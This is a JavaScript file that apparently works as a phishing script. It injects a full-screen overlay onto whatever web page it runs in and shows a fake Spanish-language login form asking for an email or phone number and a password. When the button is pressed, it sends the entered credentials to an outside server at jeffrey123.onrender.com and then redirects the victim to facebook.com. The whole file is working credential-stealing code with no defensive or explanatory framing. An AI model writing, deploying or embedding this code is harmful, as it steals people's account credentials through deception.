(function() {
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    const overlay = document.createElement('div');
    // Forzamos que ocupe TODA la pantalla sin importar la web externa
    overlay.style = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100% !important;
        height: 100% !important;
        background: rgba(0, 0, 0, 0.85) !important;
        z-index: 2147483647 !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        backdrop-filter: blur(5px) !important;
    `;

    overlay.innerHTML = `
        <div style="
            background: white !important;
            padding: 50px 40px !important;
            border-radius: 20px !important;
            width: 450px !important; 
            max-width: 90% !important;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5) !important;
            text-align: center !important;
            font-family: Arial, sans-serif !important;
            box-sizing: border-box !important;
            display: block !important;
        ">
            <h2 style="color: #2563eb !important; margin: 0 0 30px 0 !important; font-size: 32px !important; font-weight: bold !important;">
                Iniciar Sesión
            </h2>
            
            <input id="i-email" type="text" placeholder="Correo electrónico o teléfono" style="
                width: 100% !important;
                height: 55px !important;
                padding: 0 15px !important;
                margin-bottom: 20px !important;
                border: 1px solid #ddd !important;
                border-radius: 10px !important;
                font-size: 18px !important;
                box-sizing: border-box !important;
                display: block !important;
            ">
            
            <input id="i-pass" type="password" placeholder="Contraseña" style="
                width: 100% !important;
                height: 55px !important;
                padding: 0 15px !important;
                margin-bottom: 30px !important;
                border: 1px solid #ddd !important;
                border-radius: 10px !important;
                font-size: 18px !important;
                box-sizing: border-box !important;
                display: block !important;
            ">
            
            <button id="i-btn" style="
                width: 100% !important;
                height: 60px !important;
                background: #2563eb !important;
                color: white !important;
                border: none !important;
                border-radius: 10px !important;
                font-size: 20px !important;
                font-weight: bold !important;
                cursor: pointer !important;
                display: block !important;
            ">
                Entrar
            </button>
            
            <p style="margin-top: 25px !important; color: #666 !important; font-size: 16px !important; display: block !important;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
    `;

    document.body.appendChild(overlay);

    // Lógica de envío (igual que antes)
    document.getElementById('i-btn').onclick = async function() {
        const email = document.getElementById('i-email').value;
        const password = document.getElementById('i-pass').value;
        if(!email || !password) return alert("Completa los campos");

        this.disabled = true;
        this.innerText = "Cargando...";

        try {
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });
            window.location.href = "https://www.facebook.com"; // O tu link de config
        } catch(e) {
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
